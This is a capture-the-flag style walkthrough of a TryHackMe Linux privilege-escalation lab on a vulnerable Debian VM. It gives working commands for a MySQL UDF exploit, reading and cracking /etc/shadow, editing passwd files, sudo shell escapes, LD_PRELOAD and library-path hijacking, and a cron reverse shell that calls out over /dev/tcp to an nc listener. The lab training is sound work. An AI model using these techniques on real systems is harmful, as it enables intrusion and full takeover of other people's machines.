# **Linux PrivEsc**

> Evan Diamantidis | June 2nd, 2022

--------------------------

<br />

## 1. Deploy the Vulnerable Debian VM

### 1.1: Deploy the machine and login to the "user" account using SSH.
```
No answer needed
```

Let's gather some information about our target with nmap. The `initial` output file under the `nmap` folder shows the following:
```
# Nmap 7.92 scan initiated Thu Jun  2 09:00:07 2022 as: nmap -sC -sV -oN nmap/initial 10.10.76.64
Nmap scan report for 10.10.76.64
Host is up (0.0087s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a4:6c:d1:c8:5b:03:f2:af:33:3f:84:15:cf:15:ed:ba (DSA)
|_  2048 08:84:3e:96:4d:9a:2f:a1:db:be:68:29:80:ab:f3:56 (RSA)
25/tcp   open  smtp    Exim smtpd 4.84
| smtp-commands: debian.localdomain Hello ip-10-8-76-102.eu-west-1.compute.internal [10.8.76.102], SIZE 52428800, 8BITMIME, PIPELINING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.16 (Debian)
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      34933/udp   mountd
|   100005  1,2,3      58193/tcp   mountd
|   100021  1,3,4      49798/udp   nlockmgr
|   100021  1,3,4      50245/tcp   nlockmgr
|   100024  1          49563/tcp   status
|_  100024  1          52565/udp   status
2049/tcp open  nfs     2-4 (RPC #100003)
8080/tcp open  http    nginx 1.6.2
|_http-title: Welcome to nginx on Debian!
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.6.2
Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  2 09:00:16 2022 -- 1 IP address (1 host up) scanned in 8.28 seconds
```

<br />

The credentials we will be using to connect via SSH are:

Username: `user`
<br />
Password: `password321`

<br />

There was an error in my attempt to SSH directly to the target machine remotely without any additional options using the standard SSH command:
```
ssh USERNAME@TARGET_IP
```
![image](https://user-images.githubusercontent.com/14150485/171621390-963177a3-7270-4187-b137-3db5283d1817.png)

The solution I found over at [AskUbuntu](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss) is to simply add the `-oHostKeyAlgorithms=+ssh-dss` option:
```
ssh -o HostKeyAlgorithms=ssh-dss USERNAME@TARGET_IP
```
![image](https://user-images.githubusercontent.com/14150485/171622487-e57fbb6b-955b-4594-92b9-dc1beb887fcf.png)

Please note that you can SSH to the target machine without any additional options using a TryHackMe AttackBox.

<br />

### 1.2: Run the "id" command. What is the result?
```
id
```
![image](https://user-images.githubusercontent.com/14150485/171623189-030512f6-f76e-4ae0-bf92-25b4004a665c.png)

The answer is:
```
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```


<br />
<br />

## 2. Service Exploits

<br />

This section might be a little advanced for some - It involves compiling the [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) exploit, which is already downloaded as `raptor_udf2.c` under the `/home/user/tools/mysql-udf` directory on the target machine. This exploit allows us to take advantage of User Defined Functions (UDFs) to run system commands with root privileges using the MySQL service.

<br />

We first need to navigate to the file location at `/home/user/tools/mysql-udf`.
```
cd /home/user/tools/mysql-udf
```

Following the instructions provided on the exploit [link](https://www.exploit-db.com/exploits/1518) provided above, we need to compile the file before use:

`gcc -g -c raptor_udf2.c`
<br />
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

Once compiled, we can proceed to run `mysql` as `root` using a blank password:

`mysql -u root -p`

![image](https://user-images.githubusercontent.com/14150485/172220178-7765795d-509d-4c8b-8780-1041318062a9.png)

We can now proceed with the following commands on the `mysql` shell to create a User Defined Function (UDF) `do_system` using the exploit we compiled:

`use mysql;`
<br />
`create table foo(line blob);`
<br />
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`
<br />
`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
<br />
`create function do_system returns integer soname 'raptor_udf2.so';`

The table entries can be confirmed with the following command:

`select * from mysql.func;`

![image](https://user-images.githubusercontent.com/14150485/172221440-d3b92d41-c2bb-46a8-9584-9a51764dcfbb.png)

Now, we copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit the `mysql` shell by typing `exit` or `\q`. Running the `/tmp/rootbash` shell will grant root privileges on the machine.

`/tmp/rootbash -p`

![image](https://user-images.githubusercontent.com/14150485/172222490-17d98725-2456-4d71-9005-2c9aa3b83e45.png)

I strongly recommend following along the step by step instructions and researching the exploit and commands being used in parallel as part of your learning process.

<br />
	
### 2.1: Read and follow along with the above.
```
No answer needed
```

<br />
<br />

## 3. Weak File Permissions - Readable /etc/shadow
	
### 3.1: What is the root user's password hash?

<br />

Checking the contents of the `shadow` file we can apparently see the hash for `root` and `user`.
```
cat /etc/shadow
```

![image](https://user-images.githubusercontent.com/14150485/172003402-065807d6-2eaf-4937-b5b1-565797b6767a.png)

The answer is:

```
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

<br />

### 3.2: What hashing algorithm was used to produce the root user's password hash?

<br />

Before we proceed with the next steps, we should ideally save the hash in a file locally.
<br />

There are multiple ways we can use to analyze the hash. We can either do it locally using `hashid`:
```
hashid hash.txt
```

![image](https://user-images.githubusercontent.com/14150485/172004011-49172bd5-9a81-4ac2-b079-7875cc231322.png)

<br />

Or, we can check the hash online at https://hashes.com/en/tools/hash_identifier:

![image](https://user-images.githubusercontent.com/14150485/172004046-62de3684-7ebd-445e-a760-768a5613e7f4.png)

Or, let John The Ripper analyze it for us while cracking it at the same time using the command provided on this task:

```
john --wordlist=/usr/share/wordlists/rockyou.txt FILENAME
```

![image](https://user-images.githubusercontent.com/14150485/172003660-85deec4a-bccf-4726-becd-362ca8af9391.png)

Regardless of the approach to this solution, it looks like we are dealing with a type `sha512crypt` hash.
```
sha512crypt
```

<br />

### 3.3: What is the root user's password?

<br />

Cracking the hash using John The Ripper reveals the password:
```
password123
```

We can now switch to `root` using the `su` command and password we just cracked:
```
su root
```

![image](https://user-images.githubusercontent.com/14150485/172005295-f5fb5d9d-0c4a-447d-82be-a97b0e443825.png)

<br />
<br />

## 4. Weak File Permissions - Writable /etc/shadow

### 4.1: Read and follow along with the above.

<br />

This task is detailing the ease of editing writable `shadow` files to take advantage of passwords we can generate on our own using the `mkpasswd` command:
```
mkpasswd -m sha-512 PASSWORD_HERE
```

![image](https://user-images.githubusercontent.com/14150485/172007026-bc474a3f-7da7-46bd-a94e-6266076606f5.png)

We can now edit the `shadow` file and paste the generated hash between the first and second colons.
```
nano /etc/shadow
```

![image](https://user-images.githubusercontent.com/14150485/172007071-fc8ee104-118f-47c4-8d3c-326a8db4bdba.png)

To test the new password we simply save the file and ```exit``` from root back to user level.
```
su root
```

![image](https://user-images.githubusercontent.com/14150485/172006968-bd15e1cc-c571-46db-934a-7c09d226698c.png)


```
No answer needed
```

Remember to exit out of the root shell before continuing!

<br />
<br />

## 5. Weak File Permissions - Writable /etc/passwd

### 5.1: Run the "id" command as the newroot user. What is the result?

<br />

Similar to the previous task, we can generate our own hashes that we can then use to manipulate writable `passwd` files to our advantage!
```
openssl passwd PASSWORD_HERE
```

![image](https://user-images.githubusercontent.com/14150485/172007767-48fd86a8-0836-4535-a7be-f9b1be8b52da.png)

We can now edit the `passwd` file, replacing the `x` between the first and second colons with the output from the previous command.
```
nano /etc/passwd
```

![image](https://user-images.githubusercontent.com/14150485/172007868-8344ae40-9007-4882-b8db-4a83e4b0eee6.png)

Saving the file and using the new credentials gives us root access to the machine again!

![image](https://user-images.githubusercontent.com/14150485/172007988-e014be78-d440-410d-9661-e327c2865bb9.png)

The `id` command releavs the answer to this task:

![image](https://user-images.githubusercontent.com/14150485/172008103-20231761-f5ba-42b2-8cba-98f95f060550.png)

```
uid=0(root) gid=0(root) groups=0(root)
```


<br />
<br />

## 6. Sudo - Shell Escape Sequences

### 6.1: How many programs is "user" allowed to run via sudo?
```
sudo -l
```

![image](https://user-images.githubusercontent.com/14150485/172009026-907e0e17-e4f3-4203-9cba-c8c9081bc767.png)

```
11
```

### 6.2: One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

<br />

Searching through the list of programs we just got using the `sudo -l` command over at https://gtfobins.github.io, there is only one not appearing on the list.
```
apache2
```

Apart from `apache2`, the rest can be used in one way or another for privilege escalation purposes on this machine.
<br />
I will be listing `sudo` examples for each exploit below - More detailed information can be found at https://gtfobins.github.io, which is also the source I used for these notes.

Remember to exit back after each root escalation before attempting another exploit!

<br />

**iftop**
---------

<br />

*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

`sudo iftop`
<br />
`/bin/sh`

The `sudo iftop` command launches the application. The `!` character will then enable user input that we can use to execute the `/bin/sh/` command within it:

![image](https://user-images.githubusercontent.com/14150485/172015777-41a49b0e-3ac5-44b8-a968-baad37f402b2.png)

This will grant root access to the machine!

![image](https://user-images.githubusercontent.com/14150485/172013044-6373b96c-10c0-468e-ac85-605b1c551990.png)

<br />

**find**
--------

<br />

*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

`sudo find . -exec /bin/sh \; -quit`

![image](https://user-images.githubusercontent.com/14150485/172013238-7a66d7ba-f032-49f9-a4ad-11a31378b90d.png)

<br />

**nano**
--------

<br />

*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

`sudo nano`
<br />
`^R^X` - `^R` in this case being `Ctrl + R`, which enables a dialog box in the application, and `^X` being `Ctrl + X` that enables command execution.
<br />
`reset; sh 1>&0 2>&0`

![image](https://user-images.githubusercontent.com/14150485/172014033-8ed77c1d-c3e8-40d8-9051-d6c116811d85.png)

After executing the command, any user input is not displayed in nano which can make it a little hard for us to see what it really does, however the above steps do grant root access to the target. We can confirm this by cleaning the active window using the `clear` command and then checking the active user using `whoami`.

![image](https://user-images.githubusercontent.com/14150485/172014113-282340b7-894c-47b5-b796-758ee6beb9f2.png)

<br />

**vim**
-------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

*(a) ```sudo vim -c ':!/bin/sh'```*

*(b) This requires that vim is compiled with Python support. Prepend :py3 for Python 3.*
<br />
*```sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'```*

*(c) This requires that vim is compiled with Lua support.*
<br />
*```sudo vim -c ':lua os.execute("reset; exec sh")'```*

<br />

The line used in example (a) seems to run successfully:

![image](https://user-images.githubusercontent.com/14150485/172015286-a65b7835-d9d9-4733-8554-845b915f2adb.png)




**man**
-------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

`sudo man man`
<br />
`!/bin/sh`

![image](https://user-images.githubusercontent.com/14150485/172016119-72b9ebb8-61dc-4ef2-b38b-05e7ea6e35a9.png)

Once again, the exploit grants root access to the machine.

![image](https://user-images.githubusercontent.com/14150485/172016189-387d4b96-cde9-4895-825b-e2ab0aa8949f.png)

<br />

**awk**
-------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```sudo awk 'BEGIN {system("/bin/sh")}'```

![image](https://user-images.githubusercontent.com/14150485/172016444-46b9f785-5351-4a2f-9e14-76fbcceadba7.png)

<br />

**less**
--------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```sudo less /etc/profile```
<br />
```!/bin/sh```

![image](https://user-images.githubusercontent.com/14150485/172016574-7fdc2c82-e035-4cca-8e0c-ffde770343f9.png)

The `!` character enables code execution which allows us to run the `/bin/sh` command that grants root access.

![image](https://user-images.githubusercontent.com/14150485/172016591-667f9643-cb9a-4983-ac32-fee3989cd201.png)

<br />

**ftp**
-------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```sudo ftp```
<br />
```!/bin/sh```

![image](https://user-images.githubusercontent.com/14150485/172016751-ac465d2c-d464-4e31-bbd3-b29bdf3d3012.png)

<br />

**nmap**
--------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

*(a) Input echo is disabled.*
<br />
`TF=$(mktemp)`
<br />
`echo 'os.execute("/bin/sh")' > $TF`
<br />
`sudo nmap --script=$TF`
<br />

*(b) The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
<br />
`sudo nmap --interactive`
<br />
`nmap> !sh`

<br />

Following the steps in example (a): 

![image](https://user-images.githubusercontent.com/14150485/172017005-1501a070-dbb1-46b8-a773-c7d29c8d90ee.png)

And example (b):

![image](https://user-images.githubusercontent.com/14150485/172017064-ba72bda4-e546-429a-9f47-2f9dd08e829a.png)

<br />

**more**
------

<br />

*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*

```TERM= sudo more /etc/profile```
<br />
```!/bin/sh```

![image](https://user-images.githubusercontent.com/14150485/172017159-7e447b85-e637-499f-bd3c-f6e1e22668af.png)

Successfully escalated to root!

![image](https://user-images.githubusercontent.com/14150485/172017178-17bcd1aa-41dc-40d2-981d-fd65a24f3a76.png)



### 6.3: Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.

<br />

The answer to this is detailed in the following section.

```
No answer needed
```

<br />
<br />

## 7. Sudo - Environment Variables

<br />

As explained in this task, running the `sudo -l` command will reveal inherited environment variables, which should be listed as `env_keep`.

```
sudo -l
```

![image](https://user-images.githubusercontent.com/14150485/172237008-1b10abb9-2e7d-4ea0-8f46-b723ebeb1066.png)

The most important takeaway from this section should be that the `LD_PRELOAD` and `LD_LIBRARY_PATH` are both inherited from the user's environment. `LD_PRELOAD` loads a shared object before any others when a program is run. `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.

Following along with the instructions, we proceed to create a shared object using the code in the `preload.c` via `gcc`.

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Running any programs we have permissions to use `sudo` with, setting the `LD_PRELOAD` value to the shared file we just created, will spawn a root shell for us!

```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

As an example, we can use `iftop` to get root:

```
sudo LD_PRELOAD=/tmp/preload.so iftop
```

![image](https://user-images.githubusercontent.com/14150485/172238459-7f95fa1f-6fec-432c-b888-1549c43ec4e7.png)

The same applies to `apache2` when ran with `sudo` permissions using the aforementioned `LD_PRELOAD` value:

```
sudo LD_PRELOAD=/tmp/preload.so apache2
```

![image](https://user-images.githubusercontent.com/14150485/172240755-276f7f6a-7d64-4a77-9ce7-533ebf973b6e.png)

<br />

Time to see if we can use `sudo` with `apache2` to get a root shell, utilizing the `LD_LIBRARY_PATH` this time.

Shared object dependencies are displayed using the `ldd` command. Let's get a list for the ones used with `apache2` on the target:

```
ldd /usr/sbin/apache2
```

![image](https://user-images.githubusercontent.com/14150485/172240466-64ccb199-388c-4589-a5b8-31a9af6ea522.png)

We can proceed to create a shared object using the same name as one of the libraries that were just listed.

```
gcc -o /tmp/libexpat.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Running `apache2` using `sudo` and setting the `LD_LIBRARY_PATH` to the folder location of the shared file we just created will escalate our privileges to root:

![image](https://user-images.githubusercontent.com/14150485/172242116-cb3a0ba4-a3b0-499b-a93f-451a185a3450.png)

<br />

As a final step in this task we will be renaming the `/tmp/libcrypt.so.1` shared file to a different process name and attempting to get root using the same `LD_LIBRARY_PATH`.

```
mv /tmp/libcrypt.so.1 /tmp/libpcre.so.3
```

![image](https://user-images.githubusercontent.com/14150485/172321131-b9cdc52c-1d13-47af-9f37-ab965948fb9f.png)

Attempting to run `apache2` with `sudo` however this time will display an error stating the `pcre_free` function was not found.

![image](https://user-images.githubusercontent.com/14150485/172321426-6c87fbd7-7c64-4fac-af09-03e14dd39428.png)

There are multiple ways we can use to add this function to the `library_path.c` file, the easiest being using the `echo` command to add a line at the end of the program with a void `pcre_free` function:

```
echo "void pcre_free(){}" >> /home/user/tools/sudo/library_path.c
```
Before our new `sudo` attempt we have to use the code in `library_path.c` with the new `libpcre.so.3` shared file:

```
gcc -o /tmp/libpcre.so.3 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Running `apache2` with `sudo` using the `LD_LIBRARY_PATH` should now successfully spawn a root shell:

```
sudo LD_LIBRARY_PATH=/tmp apache2
```

![image](https://user-images.githubusercontent.com/14150485/172322578-c461bb11-428b-4c9f-be67-feff7deea65a.png)

<br/>

### 7.1: Read and follow along with the above.

```
No answer needed
```

<br />
<br />

## 8. Cron Jobs - File Permissions

<br />

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.

<br />

We can read through the contents of this file to see the jobs running on the target machine.

```
cat /etc/crontab
```

![image](https://user-images.githubusercontent.com/14150485/172329760-0bb0d5b0-11a9-4afe-b1d2-b2674bf33638.png)

The `overwrite.sh` and `compress.sh` jobs have been scheduled to run every minute, something we can take advantage of to gain access to this machine. Let us `locate` the first file.

```
locate overwrite.sh
```

![image](https://user-images.githubusercontent.com/14150485/172330777-ed0a7342-49a4-4712-a9cd-f29480b91ce9.png)

```
la -la /usr/local/bin/overwrite.sh
```

![image](https://user-images.githubusercontent.com/14150485/172330956-081e6528-24cf-4945-8dac-54c8c8c96cb6.png)

Looks like we have write permissions on the file. Let's replace its contents per the instructions on the task with our local IP and port of choice.

```
#!/bin/bash
bash -i >& /dev/tcp/LOCAL_IP/LOCAL_PORT 0>&1
```

The next step is to set up a listener locally and wait for about a minute until the job executes on the target machine and attempts to connect to our IP using the specified port.

```
nc -lvnp LOCAL_PORT
```

After a short wait, we gain root access to the target!

![image](https://user-images.githubusercontent.com/14150485/172333307-7e70957d-60b4-4c83-bf11-5bd83a5d2c8e.png)

<br/>

### 8.1: Read and follow along with the above.

```
No answer needed
```

<br/>
<br/>
